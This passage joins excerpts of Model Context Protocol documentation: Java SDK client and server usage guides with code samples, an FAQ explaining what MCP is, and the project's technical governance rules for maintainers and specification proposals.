poll.\n"}

It implements the client-side of the protocol, handling:\n\n- Protocol version negotiation to ensure compatibility with servers\n- Capability negotiation to determine available features\n- Message transport and JSON-RPC communication\n- Tool discovery and execution\n- Resource access and management\n- Prompt system interactions\n- Optional features like roots management and sampling support\n\n<Tip>\nThe core `io.modelcontextprotocol.sdk:mcp` module provides STDIO, Streamable-HTTP and SSE client transport implementations without requiring external web frameworks.\n\nSpring-specific transport implementations are available as an **optional** dependency `io.modelcontextprotocol.sdk:mcp-spring-webflux` for [Spring Framework](https://docs.spring.io/spring-ai/reference/api/mcp/mcp-client-boot-starter-docs.html) users.\n\n</Tip>\n\n<Tip>\n  This [quickstart demo](/quickstart/client), based on Spring AI MCP, will show\n  you how to build an AI client that connects to MCP servers.\n</Tip>\n\nThe client provides both synchronous and asynchronous APIs for flexibility in different application contexts.\n\n<Tabs>\n

For example:\n\n        ```java\n        WebClient.builder()\n            .filter((request, next) -> {\n                return Mono.deferContextual(ctx -> {\n                    var transportContext = ctx.get(McpTransportContext.KEY);\n                    var otherInfo = ctx.get(\"your-context-key\");\n                    Mono<String> token = obtainAccessToken(transportContext, otherInfo);\n                    return token.map(t -> {\n                        var newRequest = ClientRequest.from(request)\n                            .header(\"Authorization\", \"Bearer \" + t)\n                            .build();\n                        // Ensure you call next.exchange to execute the HTTP request\n                        return next.exchange(newRequest);\n                    });\n                });\n            });\n        ```\n\n         To learn how to populate context information, see [adding context information](#adding-context-information).\n\n    </Tab>\n\n</Tabs>\n\n## Client Capabilities\n\nThe client can be configured with various capabilities:\n\n```java\nvar capabilities = ClientCapabilities.builder()\n    .roots(true)      // Enable filesystem roots support with list changes notifications\n    .sampling()       // Enable LLM sampling support\n    .elicitation()    // Enable elicitation capability\n    .build();\n```\n\n### Roots Support\n\nRoots define the boundaries of where servers can operate within the filesystem:\n\n```java\n// Add a root dynamically\nclient.addRoot(new Root(\"file:///path\", \"description\"));\n\n// Remove a root\nclient.removeRoot(\"file:///path\");\n\n// Notify server of roots changes\nclient.rootsListChangedNotification();\n```\n\nThe roots capability allows servers to:\n\n- Request the list of accessible filesystem roots\n- Receive notifications when the roots list changes\n- Understand which directories and files they have access to\n\n### Sampling Support\n\nSampling enables servers to request LLM interactions (\"completions\" or \"generations\") through the client:\n\n```java\n// Configure sampling handler\nFunction<CreateMessageRequest, CreateMessageResult> samplingHandler = request -> {\n    // Sampling implementation that interfaces with LLM\n    return new CreateMessageResult(response);\n};\n\n// Create client with sampling support\nvar client = McpClient.sync(transport)\n    .capabilities(ClientCapabilities.builder()\n        .sampling()\n        .build())\n    .sampling(samplingHandler)\n    .build();\n```\n\nThis capability allows:\n\n- Servers to leverage AI capabilities without requiring API keys\n- Clients to maintain control over model access and permissions\n- Support for both text and image-based interactions\n- Optional inclusion of MCP server context in prompts\n\n### Elicitation Support\n\nElicitation enables servers to request specific information or clarification from the client:\n\n```java\n// Configure elicitation handler\nFunction<ElicitRequest, ElicitResult> elicitationHandler = request -> {\n    // Elicitation implementation that interfaces with LLM\n    return ElicitResult.builder()...build();\n};\n\n// Create client with elicitation support\nvar client = McpClient.sync(transport)\n    .capabilities(ClientCapabilities.builder()\n        .elicitation() // enable elicitation capability\n        .build())\n    .elicitation(elicitationHandler) // register elicitation handler\n    .build();\n```\n\n### Logging Support\n\nThe client can register a logging consumer to receive log messages from the server and set the minimum logging level to filter messages:\n\n```java\nvar mcpClient = McpClient.sync(transport)\n        .loggingConsumer((LoggingMessageNotification notification) -> {\n            System.out.println(\"Received log message: \" + notification.data());\n        })\n        .build();\n\nmcpClient.initialize();\n\nmcpClient.setLoggingLevel(McpSchema.LoggingLevel.INFO);\n\n// Call the tool that can sends logging notifications\nCallToolResult result = mcpClient.callTool(new McpSchema.CallToolRequest(\"logging-test\", Map.of()));\n```\n\nClients can control the minimum logging level they receive through the `mcpClient.setLoggingLevel(level)` request. Messages below the set level will be filtered out.\nSupported logging levels (in order of increasing severity): DEBUG (0), INFO (1), NOTICE (2), WARNING (3), ERROR (4), CRITICAL (5), ALERT (6), EMERGENCY (7)\n\n### Progress Support\n\nThe client can register a progress consumer to receive progress updates from the server:\n\n```java\nvar mcpClient = McpClient.sync(transport)\n        .progressConsumer((ProgressNotification progress) -> {\n            System.out.println(\"Received progress update: \" + progress.data());\n        })\n        .build();\n\nmcpClient.initialize();\n\n// Call the tool that can sends progress notifications\nCallToolResult result = mcpClient.callTool(new McpSchema.CallToolRequest(\"progress-test\", Map.of()));\n```\n\n### Change Notifications\n\nThe client can register a change consumer to receive change notifications from the server about tools, resources, or prompts updates:\n\n```java\n\nvar spec = McpClient.sync(transport);\n\n// Adds a consumer to be notified when the available tools change, such as tools\n// being added or removed.\nspec.toolsChangeConsumer((List<McpSchema.Tool> tools) -> {\n    // Handle tools change\n});\n\n// Adds a consumer to be notified when the available resources change, such as resources\n// being added or removed.\nspec.resourcesChangeConsumer((List<McpSchema.Resource> resources) -> {\n    // Handle resources change\n});\n\n// Adds a consumer to be notified when the available prompts change, such as prompts\n// being added or removed.\nspec.promptsChangeConsumer((List<McpSchema.Prompt> prompts) -> {\n    // Handle prompts change\n\n});\n```\n\n## Using MCP Clients\n\n### Tool Execution\n\nTools are server-side functions that clients can discover and execute. The MCP client provides methods to list available tools and execute them with specific parameters. Each tool has a unique name and accepts a map of parameters.\n\n<Tabs>\n  <Tab title=\"Sync API\">\n\n```java\n// List available tools and their names\nvar tools = client.listTools();\ntools.forEach(tool -> System.out.println(tool.getName()));\n\n// Execute a tool with parameters\nvar result = client.callTool(\"calculator\", Map.of(\n    \"operation\", \"add\",\n    \"a\", 1,\n    \"b\", 2\n));\n```\n\n  </Tab>\n\n  <Tab title=\"Async API\">\n\n```java\n// List available tools asynchronously\nclient.listTools()\n    .doOnNext(tools -> tools.forEach(tool ->\n        System.out.println(tool.getName())))\n    .subscribe();\n\n// Execute a tool asynchronously\nclient.callTool(\"calculator\", Map.of(\n        \"operation\", \"add\",\n        \"a\", 1,\n        \"b\", 2\n    ))\n    .subscribe();\n```\n\n  </Tab>\n</Tabs>\n\n### Resource Access\n\nResources represent server-side data sources that clients can access using URI templates. The MCP client provides methods to discover available resources and retrieve their contents through a standardized interface.\n\n<Tabs>\n  <Tab title=\"Sync API\">\n\n```java\n// List available resources and their names\nvar resources = client.listResources();\nresources.forEach(resource -> System.out.println(resource.getName()));\n\n// Retrieve resource content using a URI template\nvar content = client.getResource(\"file\", Map.of(\n    \"path\", \"/path/to/file.txt\"\n));\n```\n\n  </Tab>\n\n  <Tab title=\"Async API\">\n\n```java\n// List available resources asynchronously\nclient.listResources()\n    .doOnNext(resources -> resources.forEach(resource ->\n        System.out.println(resource.getName())))\n    .subscribe();\n\n// Retrieve resource content asynchronously\nclient.getResource(\"file\", Map.of(\n        \"path\", \"/path/to/file.txt\"\n    ))\n    .subscribe();\n```\n\n  </Tab>\n</Tabs>\n\n### Prompt System\n\nThe prompt system enables interaction with server-side prompt templates. These templates can be discovered and executed with custom parameters, allowing for dynamic text generation based on predefined patterns.\n\n<Tabs>\n  <Tab title=\"Sync API\">\n\n```java\n// List available prompt templates\nvar prompts = client.listPrompts();\nprompts.forEach(prompt -> System.out.println(prompt.getName()));\n\n// Execute a prompt template with parameters\nvar response = client.executePrompt(\"echo\", Map.of(\n    \"text\", \"Hello, World!\"\n));\n```\n\n  </Tab>\n\n  <Tab title=\"Async API\">\n\n```java\n// List available prompt templates asynchronously\nclient.listPrompts()\n    .doOnNext(prompts -> prompts.forEach(prompt ->\n        System.out.println(prompt.getName())))\n    .subscribe();\n\n// Execute a prompt template asynchronously\nclient.executePrompt(\"echo\", Map.of(\n        \"text\", \"Hello, World!\"\n    ))\n    .subscribe();\n```\n\n  </Tab>\n</Tabs>\n\n### Using Completion\n\nAs part of the [Completion capabilities](/specification/2025-03-26/server/utilities/completion), MCP provides a standardized way for servers to offer argument autocompletion suggestions for prompts and resource URIs.\n\nCheck the [Server Completion capabilities](/sdk/java/mcp-server#completion-specification) to learn how to enable and configure completions on the server side.\n\nOn the client side, the MCP client provides methods to request auto-completions:\n\n<Tabs>\n  <Tab title=\"Sync API\">\n\n```java\n\nCompleteRequest request = new CompleteRequest(\n        new PromptReference(\"code_review\"),\n        new CompleteRequest.CompleteArgument(\"language\", \"py\"));\n\nCompleteResult result = syncMcpClient.completeCompletion(request);\n\n```\n\n  </Tab>\n\n  <Tab title=\"Async API\">\n\n```java\n\nCompleteRequest request = new CompleteRequest(\n        new PromptReference(\"code_review\"),\n        new CompleteRequest.CompleteArgument(\"language\", \"py\"));\n\nMono<CompleteResult> result = mcpClient.completeCompletion(request);\n\n```\n\n  </Tab>\n</Tabs>\n\n### Adding context information\n\nHTTP request sent through SSE or Streamable HTTP transport can be customized with\ndedicated APIs (see [client transport](#client-transport)). These customizers may need\nadditional context-specific information that must be injected at the client level.\n\n<Tabs>\n  <Tab title=\"Sync API\">\n\nThe `McpSyncClient` is used in a blocking environment, and may rely on thread-locals to share information.\nFor example, some frameworks store the current server request or security tokens in a thread-local.\nTo make this type of information available to underlying transports, use `SyncSpec#transportContextProvider`:\n\n```java\nMcpClient.sync(transport)\n    .transportContextProvider(() -> {\n        var data = obtainDataFromThreadLocals();\n        return McpTransportContext.create(\n                Map.of(\"some-data\", data)\n        );\n    })\n    .build();\n```\n\nThis `McpTransportContext` will be available in HttpClient-based `McpSyncHttpClientRequestCustomizer`\nand WebClient-based `ExchangeFilterFunction`.\n\n  </Tab>\n\n  <Tab title=\"Async API\">\n\nThe `McpAsyncClient` is used in a reactive environment.\nInformation is passed through the reactive chain using the [Reactor context](https://projectreactor.io/docs/core/release/reference/advancedFeatures/context.html).\nTo insert data in the Reactor context, use `contextWrite` when calling client operations:\n\n```java\nvar client = McpClient.async(transport)\n    // ...\n    .build();\n\nMono<McpSchema.ListToolsResult> toolList = client\n    .listTools()\n    .contextWrite(ctx -> {\n        var transportContext = McpTransportContext.create(\n            Map.of(\"some-key\", \"some value\")\n        );\n        return ctx.put(McpTransportContext.KEY, transportContext)\n            .put(\"reactor-context-key\", \"some reactor value\");\n    });\n```\n\nWith this, the `McpTransportContext` will be available in HttpClient-based `McpAsyncHttpClientRequestCustomizer`.\nThe entire Reactor context is also available in both `McpAsyncHttpClientRequestCustomizer`\nand WebClient's `ExchangeFilterFunction`, through `Mono.deferContextual`:\n\n```java\nWebClient.builder()\n    .filter((request, next) -> {\n        return Mono.deferContextual(ctx -> {\n            var transportContext = ctx.get(McpTransportContext.KEY);\n            var someReactorValue = ctx.get(\"reactor-context-key\");\n            // ... use context values ...\n        });\n    });\n```\n\n  </Tab>\n</Tabs>\n"}

Servlet-based `SSE` and `Streamable-HTTP` server transport\n  - Optional Spring-based transports (convenience if using Spring Framework):\n    - WebFlux `SSE` and `Streamable-HTTP` client and server transports\n    - WebMVC `SSE` and `Streamable-HTTP` transport for servlet-based HTTP streaming\n- Supports Synchronous and Asynchronous programming paradigms\n\n<Tip>\n\nThe core `io.modelcontextprotocol.sdk:mcp` module provides default `STDIO`, `SSE` and `Streamable-HTTP` client and server transport implementations without requiring external web frameworks.\n\nSpring-specific transports are available as optional dependencies for convenience when using the [Spring AI](https://docs.spring.io/spring-ai/reference/1.1-SNAPSHOT/api/mcp/mcp-overview.html) Framework.\n\n</Tip>\n\n## Architecture\n\nThe SDK follows a layered architecture with clear separation of concerns:\n\n{/* ![MCP Stack Architecture](/images/java/mcp-stack.svg) */}\n\n- **Client/Server Layer (McpClient/McpServer)**: Both use McpSession for sync/async operations,\n  with McpClient handling client-side protocol operations and McpServer managing server-side protocol operations.\n- **Session Layer (McpSession)**: Manages communication patterns and state using DefaultMcpSession implementation.\n- **Transport Layer (McpTransport)**: Handles JSON-RPC message serialization/deserialization via:\n  - StdioTransport (stdin/stdout) in the core module\n  - HTTP `Streamable-HTTP` and `SSE` transports in dedicated transport modules (Java HttpClient, Spring WebFlux, Spring WebMVC)\n\nThe [MCP Client](/sdk/java/mcp-client) is a key component in the Model Context Protocol (MCP) architecture, responsible for establishing and managing connections with MCP servers.\nIt implements the client-side of the protocol.\n\n![Java MCP Client Architecture](/images/java/java-mcp-client-architecture.jpg)\n\nThe [MCP Server](/sdk/java/mcp-server) is a foundational component in the Model Context Protocol (MCP) architecture that provides tools, resources, and capabilities to clients.\nIt implements the server-side of the protocol.\n\n![Java MCP Server Architecture](/images/java/java-mcp-server-architecture.jpg)\n\nKey Interactions:\n\n- **Client/Server Initialization**: Transport setup, protocol compatibility check, capability negotiation, and implementation details exchange.\n- **Message Flow**: JSON-RPC message handling with validation, type-safe response processing, and error handling.\n- **Resource Management**: Resource discovery, URI template-based access, subscription system, and content retrieval.\n\n## Dependencies\n\nAdd the following dependencies to your project:\n\n<Tabs>\n  <Tab title=\"Maven\">\n\n    The core MCP functionality:\n\n    ```xml\n    <dependency>\n        <groupId>io.modelcontextprotocol.sdk</groupId>\n        <artifactId>mcp</artifactId>\n    </dependency>\n    ```\n\n    The core `mcp` module already includes default `STDIO`, `SSE` and `Streamable-HTTP` transport implementations and doesn't require external web frameworks.\n\n    If you're using the Spring Framework and want to use Spring-specific transport implementations, add one of the following optional dependencies:\n\n    ```xml\n    <!-- Optional: Spring WebFlux-based SSE and Streamable-HTTP client and server transports -->\n    <dependency>\n        <groupId>io.modelcontextprotocol.sdk</groupId>\n        <artifactId>mcp-spring-webflux</artifactId>\n    </dependency>\n\n    <!-- Optional: Spring WebMVC-based SSE and Streamable-HTTP server transports -->\n    <dependency>\n        <groupId>io.modelcontextprotocol.sdk</groupId>\n        <artifactId>mcp-spring-webmvc</artifactId>\n    </dependency>\n    ```\n\n  </Tab>\n  <Tab title=\"Gradle\">\n\n    The core MCP functionality:\n\n    ```groovy\n    dependencies {\n      implementation platform(\"io.modelcontextprotocol.sdk:mcp\")\n      //...\n    }\n    ```\n\n    The core `mcp` module already includes default `STDIO`, `SSE` and `Streamable-HTTP` transport implementations and doesn't require external web frameworks.\n\n    If you're using the Spring Framework and want to use Spring-specific transport implementations, add one of the following optional dependencies:\n\n    ```groovy\n    // Optional: Spring WebFlux-based SSE and Streamable-HTTP client and server transports\n    dependencies {\n      implementation platform(\"io.modelcontextprotocol.sdk:mcp-spring-webflux\")\n    }\n\n    // Optional: Spring WebMVC-based SSE and Streamable-HTTP server transports\n    dependencies {\n      implementation platform(\"io.modelcontextprotocol.sdk:mcp-spring-webmvc\")\n    }\n    ```\n\n  </Tab>\n</Tabs>\n\n- `io.modelcontextprotocol.sdk:mcp-spring-webflux` -

It implements the server-side of the protocol, responsible for:\n\n- Exposing tools that clients can discover and execute.\n  Supports input and output schemas and returns structured and unstructured content types.\n- Managing resources with URI-based access patterns\n- Providing prompt templates and handling prompt requests\n- Supporting capability negotiation with clients\n- Implementing server-side protocol operations\n- Managing concurrent client connections\n- Providing structured logging, progress tracking, and notifications\n- Provides `STDIO`, `Streamable-HTTP` and `SSE` server transport implementations without requiring external web frameworks.\n- **Optional**, Spring-specific transport dependencies `io.modelcontextprotocol.sdk:mcp-spring-webflux`, `io.modelcontextprotocol.sdk:mcp-spring-webmvc` for [Spring AI](https://docs.spring.io/spring-ai/reference/api/mcp/mcp-server-boot-starter-docs.html) users.\n\n<Tip>\n  This [quickstart demo](/quickstart/server), based on Spring AI MCP, will show\n  you how to build an MCP server.\n</Tip>\n\nThe server supports both synchronous and asynchronous APIs, allowing for flexible integration in different application contexts.\n\n<Tabs>\n  <Tab title=\"Sync API\">\n    ```java\n    // Create a server with custom configuration\n    McpSyncServer syncServer = McpServer.sync(transportProvider)\n        .serverInfo(\"my-server\", \"1.0.0\")\n        .capabilities(ServerCapabilities.builder()\n            .resources(false, true)  // Enable resource support\n            .tools(true)             // Enable tool support\n            .prompts(true)           // Enable prompt support\n            .logging()               // Enable logging support\n            .completions()           // Enable completions support\n            .build())\n        .build();\n\n    // Register tools, resources, and prompts\n    syncServer.addTool(syncToolSpecification);\n    syncServer.addResource(syncResourceSpecification);\n    syncServer.addPrompt(syncPromptSpecification);\n\n    // Close the server when done\n    syncServer.close();\n    ```\n\n    ### Preserving thread-locals in handlers\n\n    `McpSyncServer` delegates execution to an underlying `McpAsyncServer`.\n    Execution of handlers for tools, resources, etc, may not happen on the thread calling the method.\n    In that case, thread-locals are lost, which may break certain features in frameworks relying on thread-bound work.\n    To ensure execution happens on the calling thread, and that thread-locals remain available, set `McpServer.sync(...).immediateExecution(true)`.\n\n    <Note>\n    This is only relevant to Sync servers. Async servers use the reactive stack and should not rely on thread-locals.\n    </Note>\n\n  </Tab>\n\n  <Tab title=\"Async API\">\n    ```java\n    // Create an async server with custom configuration\n    McpAsyncServer asyncServer = McpServer.async(transportProvider)\n        .serverInfo(\"my-server\", \"1.0.0\")\n        .capabilities(ServerCapabilities.builder()\n            .resources(false, true)     // Enable resource support\n            .tools(true)                // Enable tool support\n            .prompts(true)              // Enable prompt support\n            .logging()                  // Enable logging support\n            .completions()              // Enable completions support\n            .build())\n        .build();\n\n    // Register tools, resources, and prompts\n    asyncServer.addTool(asyncToolSpecification)\n        .doOnSuccess(v -> logger.info(\"Tool registered\"))\n        .subscribe();\n\n    asyncServer.addResource(asyncResourceSpecification)\n        .doOnSuccess(v -> logger.info(\"Resource registered\"))\n        .subscribe();\n\n    asyncServer.addPrompt(asyncPromptSpecification)\n        .doOnSuccess(v -> logger.info(\"Prompt registered\"))\n        .subscribe();\n\n    // Close the server when done\n    asyncServer.close()\n        .doOnSuccess(v -> logger.info(\"Server closed\"))\n        .subscribe();\n    ```\n\n  </Tab>\n</Tabs>\n\n## Server Transport Providers\n\nThe transport layer in the MCP SDK is responsible for handling the communication between clients and servers.\nIt provides different implementations to support various communication protocols and patterns.\nThe SDK includes several built-in transport provider implementations:\n\n<Tabs>\n\n  <Tab title=\"STDIO\">\n    Create in-process based transport:\n\n    ```java\n    StdioServerTransportProvider transportProvider = new StdioServerTransportProvider(new ObjectMapper());\n    ```\n\n    Provides bidirectional JSON-RPC message handling over standard input/output streams with non-blocking message processing, serialization/deserialization, and graceful shutdown support.\n\n    Key features:\n    <ul>\n      <li>Bidirectional communication through stdin/stdout</li>\n      <li>Process-based integration support</li>\n      <li>Simple setup and configuration</li>\n      <li>Lightweight implementation</li>\n    </ul>\n\n  </Tab>\n  <Tab title=\"WebFlux\">\n    <p>WebFlux-based SSE and Streamable-HTTP server transport.

handler function processes requests and returns the completion response.\nThe first argument is `McpAsyncServerExchange` for client interaction, and the second argument is a `CompleteRequest` instance.\n\nCheck the [using completion](/sdk/java/mcp-client#using-completion) to learn how to use the completion capabilities on the client side.\n\n### Using Sampling from a Server\n\nTo use

The\nlog notifications can only be sent from within an existing client session, such as tools, resources, and prompts calls.\n\nFor example, we can send a log message from within a tool handler function.\nOn the client side, you can register a logging consumer to receive log messages from the server and set the minimum logging level to filter messages.\n\n```java\nvar mcpClient = McpClient.sync(transport)\n        .loggingConsumer(notification -> {\n            System.out.println(\"Received log message: \" + notification.data());\n        })\n        .build();\n\nmcpClient.initialize();\n\nmcpClient.setLoggingLevel(McpSchema.LoggingLevel.INFO);\n\n// Call the tool that sends logging notifications\nCallToolResult result = mcpClient.callTool(new McpSchema.CallToolRequest(\"logging-test\", Map.of()));\n```\n\nThe server can send log messages using the `McpAsyncServerExchange`/`McpSyncServerExchange` object in the tool/resource/prompt handler function:\n\n```java\nvar tool = new McpServerFeatures.AsyncToolSpecification(\n    new McpSchema.Tool(\"logging-test\", \"Test logging notifications\", emptyJsonSchema),\n    (exchange, request) -> {\n\n      exchange.loggingNotification( // Use the exchange to send log messages\n          McpSchema.LoggingMessageNotification.builder()\n            .level(McpSchema.LoggingLevel.DEBUG)\n            .logger(\"test-logger\")\n            .data(\"Debug message\")\n            .build())\n        .block();\n\n      return Mono.just(new CallToolResult(\"Logging test completed\", false));\n    });\n\nvar mcpServer = McpServer.async(mcpServerTransportProvider)\n  .serverInfo(\"test-server\", \"1.0.0\")\n  .capabilities(\n    ServerCapabilities.builder()\n      .logging() // Enable logging support\n      .tools(true)\n      .build())\n  .tools(tool)\n  .build();\n```\n\nClients can control the minimum logging level they receive through the `mcpClient.setLoggingLevel(level)` request. Messages below the set level will be filtered out.\nSupported logging levels (in order of increasing severity): DEBUG (0), INFO (1), NOTICE (2), WARNING (3), ERROR (4), CRITICAL (5), ALERT (6), EMERGENCY (7)\n\n## Error Handling\n\nThe SDK provides comprehensive error handling through the McpError class, covering protocol compatibility, transport communication, JSON-RPC messaging, tool execution, resource management, prompt handling, timeouts, and connection issues. This unified error handling approach ensures consistent and reliable error management across both synchronous and asynchronous operations.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/faqs.mdx","content":"---\ntitle: \"FAQs\"\ndescription: \"Explaining MCP and why it matters in simple terms\"\n---\n\n## What is MCP?\n\nMCP (Model Context Protocol) is a standard way for AI applications and agents to connect to and work with your data sources (e.g. local files, databases, or content repositories) and tools (e.g. GitHub, Google Maps, or Puppeteer).\n\nThink of MCP as a universal adapter for AI applications, similar to what USB-C is for physical devices. USB-C acts as a universal adapter to connect devices to various peripherals and accessories. Similarly, MCP provides a standardized way to connect AI applications to different data and tools.\n\nBefore USB-C, you needed different cables for different connections. Similarly, before MCP, developers had to build custom connections to each data source or tool they wanted their AI application to work with—a time-consuming process that often resulted in limited functionality. Now, with MCP, developers can easily add connections to their AI applications, making their applications much more powerful from day one.\n\n## Why does MCP matter?\n\n### For AI application users\n\nMCP means your AI applications can access the information and tools you work with every day, making them much more helpful. Rather than AI being limited to what it already knows about, it can now understand your specific documents, data, and work context.\n\nFor example, by using MCP servers, applications can access your personal documents from Google Drive or data about your codebase from GitHub, providing more personalized and contextually relevant assistance.\n\nImagine asking an AI assistant: \"Summarize last week's team meeting notes and schedule follow-ups with everyone.\"\n\nBy using connections to data sources powered by MCP, the AI assistant can:\n\n- Connect to your Google Drive through an MCP server to read meeting notes\n- Understand who needs follow-ups based on the notes\n- Connect to your calendar through another MCP server to schedule the meetings automatically\n\n### For developers\n\nMCP reduces development time and complexity when building AI applications that need to access various data sources. With MCP, developers can focus on building great AI experiences rather than repeatedly creating custom connectors.\n\nTraditionally, connecting applications with data sources required building custom, one-off connections for each data source and each application. This created significant duplicative work—every developer wanting to connect their AI application to Google Drive or Slack needed to build their own connection.\n\nMCP simplifies this by enabling developers to build MCP servers for data sources that are then reusable by various applications. For example, using the open source Google Drive MCP server, many different applications can access data from Google Drive without each developer needing to build a custom connection.\n\nThis open source ecosystem of MCP servers means developers can leverage existing work rather than starting from scratch, making it easier to build powerful AI applications that seamlessly integrate with the tools and data sources their users already rely on.\n\n## How does MCP work?\n\n<Frame>\n  <img src=\"/images/mcp-simple-diagram.png\" />\n</Frame>\n\nMCP creates a bridge between your AI applications and your data through a straightforward system:\n\n- **MCP servers** connect to your data sources and tools (like Google Drive or Slack)\n- **MCP clients** are run by AI applications (like Claude Desktop) to connect them to these servers\n- When you give permission, your AI application discovers available MCP servers\n- The AI model can then use these connections to read information and take actions\n\nThis modular system means new capabilities can be added without changing AI applications themselves—just like adding new accessories to your computer without upgrading your entire system.\n\n## Who creates and maintains MCP servers?\n\nMCP servers are developed and maintained by:\n\n- Developers at Anthropic who build servers for common tools and data sources\n- Open source contributors who create servers for tools they use\n- Enterprise development teams building servers for their internal systems\n- Software providers making their applications AI-ready\n\nOnce an open source MCP server is created for a data source, it can be used by any MCP-compatible AI application, creating a growing ecosystem of connections. See our [list of example servers](/examples), or [get started building your own server](/quickstart/server).\n"}

This document outlines how the project is organized and how decisions are made.\n\n## Technical Governance\n\nThe MCP project adopts a hierarchical structure, similar to Python, PyTorch and other open source projects:\n\n- A community of **contributors** who file issues, make pull requests, and contribute to the project.\n- A small set of **maintainers** drive components within the MCP project, such as SDKs, documentation, and others.\n- Contributors and maintainers are overseen by **core maintainers**, who drive the overall project direction.\n- The core maintainers have two **lead core maintainers** who are the catch-all decision makers.\n- Maintainers, core maintainers, and lead core maintainers form the **MCP steering group**.\n\nAll maintainers are expected to have a strong bias towards MCP's design philosophy. Membership in the technical governance process is for individuals, not companies. That is, there are no seats reserved for specific companies, and membership is associated with the person rather than the company employing that person. This ensures that maintainers act in the best interests of the protocol itself and the open source community.\n\n### Channels\n\nTechnical Governance is facilitated through a shared [Discord server](/community/communication#discord) of all **maintainers, core maintainers** and **lead maintainers**. Each maintainer group can choose additional communication channels, but all decisions and their supporting discussions must be recorded and made transparently available on the Discord server.\n\n### Maintainers\n\nMaintainers are responsible for [Working or Interest Groups](/community/working-interest-groups) within the MCP project. These generally are independent repositories such as language-specific SDKs, but can also extend to subdirectories of a repository, such as the MCP documentation. Maintainers may adopt their own rules and procedures for making decisions. Maintainers are expected to make decisions for their respective projects independently, but can defer or escalate to the core maintainers when needed.\n\nMaintainers are responsible for the:\n\n- Thoughtful and productive engagement with community contributors,\n- Maintaining and improving their respective area of the MCP project,\n- Supporting documentation, roadmaps and other adjacent parts of the MCP project,\n- Present ideas from community to core.\n\nMaintainers are encouraged to propose additional maintainers when needed. Maintainers can only be appointed and removed by core maintainers or lead core maintainers at any time and without reason.\n\nMaintainers have write and/or admin access to their respective repositories.\n\n### Core Maintainers\n\nThe core maintainers are expected to have a deep understanding of the Model Context Protocol and its specification. Their responsibilities include:\n\n- Designing, reviewing and steering the evolution of the MCP specification, as well as all other parts of the MCP project, such as documentation,\n- Articulating a cohesive long-term vision for the project,\n- Mediating and resolving contentious issues with fairness and transparency, seeking consensus where possible while making decisive choices when necessary,\n- Appoint or remove maintainers,\n- Stewardship of the MCP project in the best interest of MCP.\n\nThe core maintainers as a group have the power to veto any decisions made by maintainers by majority vote. The core maintainers have power to resolve disputes as they see fit. The core maintainers should publicly articulate their decision-making. The core group is responsible for adopting their own procedures for making decisions.\n\nCore maintainers generally have write and admin access to all MCP repositories, but should use the same contribution (usually pull-requests) mechanism as outside contributors. Exceptions can be made based on security considerations.\n\n### Lead Maintainers (BDFL)\n\nMCP has two lead maintainers: Justin Spahr-Summers and David Soria Parra. Lead Maintainers can veto any decision by core maintainers or maintainers. This model is also commonly known as Benevolent Dictator for Life (BDFL) in the open source community. The Lead Maintainers should publicly articulate their decision-making and give clear reasoning for their decisions. Lead maintainers are part of the core maintainer group.\n\nThe Lead Maintainers are responsible for confirming or removing core maintainers.\n\nLead Maintainers are administrators on all infrastructure for the MCP project where possible. This includes but is not restricted to all communication channels, GitHub organizations and repositories.\n\n### Decision Process\n\nThe core maintainer group meets every two weeks to discuss and vote on proposals, as well as discuss any topics needed. The shared Discord server can be used to discuss and vote on smaller proposals if needed.\n\nThe lead maintainer, core maintainer, and maintainer group should attempt to meet in person every three to six months.\n\n## Processes\n\nCore and lead maintainers are responsible for all aspects of Model Context Protocol, including documentation, issues, suggestions for content, and all other parts under the [MCP project](https://github.com/modelcontextprotocol). Maintainers are responsible for documentation, issues, and suggestions of content for their area of the MCP project, but are encouraged to partake in general maintenance of the MCP projects. Maintainers, core maintainers, and lead maintainers should use the same contribution process as external contributors, rather than making direct changes to repos. This provides insight into intent and opportunity for discussion.\n\n### Working and Interest Groups\n\nMCP collaboration and contributions are organized around two structures: [Working Groups and Interest Groups](/community/working-interest-groups).\n\nInterest Groups are responsible for identifying and articulating problems that MCP should address, primarily by facilitating open discussions within the community. In contrast, Working Groups focus on developing concrete solutions by collaboratively producing deliverables, such as SEPs or community-owned implementations of the specification. While input from Interest Groups can help justify the formation of a Working Group, it is not a strict requirement. Similarly, contributions from either Interest Groups or Working Groups are encouraged, but not mandatory, when submitting SEPs or other community proposals.\n\nWe strongly encourage all contributors interested in working on a specific SEP to first collaborate within an Interest Group. This collaborative process helps ensure that the proposed SEP aligns with protocol needs and is the right direction for its adopters.\n\n#### Governance Principles\n\nAll groups are self-governed while adhering to these core principles:\n\n1. Clear contribution and decision-making processes\n2. Open communication and transparent decisions\n\nBoth must:\n\n- Document their contribution process\n- Maintain transparent communication\n- Make decisions publicly (groups must publish meeting notes and proposals)\n\nProjects and working groups without specified processes default to:\n\n- GitHub pull requests and issues for contributions\n- A public channel in the official [MCP Contributor Discord](/community/communication#discord)\n\n#### Maintenance Responsibilities\n\nComponents without dedicated maintainers (such as documentation) fall under core maintainer responsibility. These follow standard contribution guidelines through pull requests, with maintainers handling reviews and escalating to core maintainer review for any significant changes.\n\nCore maintainers and maintainers are encouraged to improve any part of the MCP project, regardless of formal maintenance assignments.\n\n### Specification Project\n\n#### Specification Enhancement Proposal (SEP)\n\nProposed changes to the specification must come in the form of a written version, starting with a summary of the proposal, outlining the **problem** it tries to solve, propose **solution**, **alternatives**, **considerations, outcomes** and **risks**. The [SEP Guidelines](/community/sep-guidelines) outline information on the expected structure of SEPs. SEPs are submitted as pull requests to the [`seps/` directory](https://github.com/modelcontextprotocol/specification/tree/main/seps) in the specification repository.\n\nAll proposals must have a **sponsor** from the MCP steering group (maintainer, core maintainer or lead core maintainer). The sponsor is responsible for ensuring that the proposal is actively developed, meets the quality standard for proposals, **updating the SEP status** in the markdown file, and presenting and discussing it in meetings of core maintainers. Maintainer and Core Maintainer groups should review open proposals without sponsors at regular intervals. Proposals that do not find a sponsor within six months are automatically rejected.\n\nOnce proposals have a sponsor, the sponsor assigns themselves to the PR and updates the SEP status to `draft`.\n\n## Communication\n\n### Core Maintainer Meetings\n\nThe core maintainer group meets on a bi-weekly basis to discuss proposals and the project. Notes on proposals should be made public. The core maintainer group will strive to meet in person every 3-6 months.\n\n### Public Chat\n\nThe MCP project maintains a [public Discord server](/community/communication#discord) with open chats for interest groups. The MCP project may have private channels for certain communications.\n\n## Nominating, Confirming and Removing Maintainers\n\n### The Principles\n\n- Membership in module maintainer groups is given to **individuals** on merit basis after they demonstrated strong expertise of their area of work through contributions, reviews, and discussions and are aligned with the overall MCP direction.\n- For membership in the 